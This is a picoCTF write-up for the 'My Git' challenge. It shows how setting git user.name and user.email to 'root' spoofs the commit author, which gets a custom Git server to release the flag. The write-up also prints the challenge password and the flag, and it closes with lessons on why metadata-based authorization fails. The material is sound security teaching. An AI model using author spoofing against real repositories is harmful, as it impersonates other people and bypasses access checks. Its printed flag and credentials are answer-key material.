# picoCTF Write-up: My Git

## Challenge Information

| Field          | Value          |
| -------------- | -------------- |
| Challenge Name | My Git         |
| Category       | General Skills |
| Difficulty     | very easy      |
| Author         | DARKRAICG492   |

---

# Description

I have built my own Git server with my own rules!

You can clone the challenge repo using the command below.

```bash
git clone ssh://git@foggy-cliff.picoctf.net:63036/git/challenge.git
```

Password:

```
32a53fa0
```

Hint:

> How do you specify your Git username and email?

The README inside the repository contains additional instructions.

---

# Objective

Retrieve the flag by interacting with the custom Git server.

---

# Initial Exploration

First, clone the repository provided in the challenge.

```bash
git clone ssh://git@foggy-cliff.picoctf.net:63036/git/challenge.git
```

After entering the password (`32a53fa0`), the repository clones successfully.

Navigate into the repository:

```bash
cd challenge
ls
```

Output:

```
README.md
```

Open the README file:

```bash
cat README.md
```

Contents:

```
# MyGit

### If you want the flag, make sure to push the flag!

Only flag.txt pushed by root:root@picoctf will be updated with the flag.

GOOD LUCK!
```

---

# Key Observation

The README reveals an important condition:

```
Only flag.txt pushed by root:root@picoctf will be updated with the flag.
```

This indicates that the Git server checks the **commit author metadata**.

Git commits store author information separately from authentication.
This means we can **spoof the commit author** locally.

Git does not verify identity cryptographically by default.

---

# Exploitation Strategy

The goal is to impersonate:

```
root
root@picoctf
```

Git allows us to set the commit author identity using configuration settings.

---

# Step 1 — Change Git Author Identity

Set the username and email to match the required identity.

```bash
git config user.name "root"
git config user.email "root@picoctf"
```

This modifies the metadata stored in future commits.

---

# Step 2 — Create the Required File

The README specifies the server looks for a file named:

```
flag.txt
```

Create the file:

```bash
echo "Give me your flag pls." > flag.txt
```

---

# Step 3 — Commit the File

Add the file and commit it.

```bash
git add flag.txt
git commit -m "sent your flag?"
```

Example output:

```
[master ae06f01] sent your flag?
 1 file changed, 1 insertion(+)
 create mode 100644 flag.txt
```

---

# Step 4 — Push to the Remote Server

Push the commit to the Git server.

```bash
git push origin master
```

After entering the password again, the server processes the commit.

Server response:

```
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_f3a6488d}
```

---

# Flag

```
picoCTF{1mp3rs0n4t4_g17_345y_f3a6488d}
```

---

# Why the Exploit Works

Git commits contain metadata fields including:

* Author Name
* Author Email
* Commit Message
* Timestamp

Example commit metadata:

```
Author: root <root@picoctf>
```

Since the challenge server **only checked commit metadata**, it trusted the author field without verifying authenticity.

This allows attackers to **impersonate any user** by modifying local Git configuration.

---

# Security Lesson

This challenge demonstrates an important security concept:

**Git author metadata is not a secure authentication mechanism.**

Anyone can set:

```bash
git config user.name
git config user.email
```

Therefore, systems must **not rely on commit metadata for authentication or authorization**.

Secure alternatives include:

* SSH key verification
* Signed commits (GPG)
* Server-side authentication checks
* Access control lists

---

# Summary

Attack steps:

1. Clone the repository.
2. Read the README instructions.
3. Spoof Git author identity (`root:root@picoctf`).
4. Create `flag.txt`.
5. Commit the file.
6. Push to the server.
7. The server trusts the commit metadata and returns the flag.

---

# Key Takeaway

Never trust **client-supplied metadata** for authentication.

Git author information can be **easily forged**, making it unsuitable for security decisions.
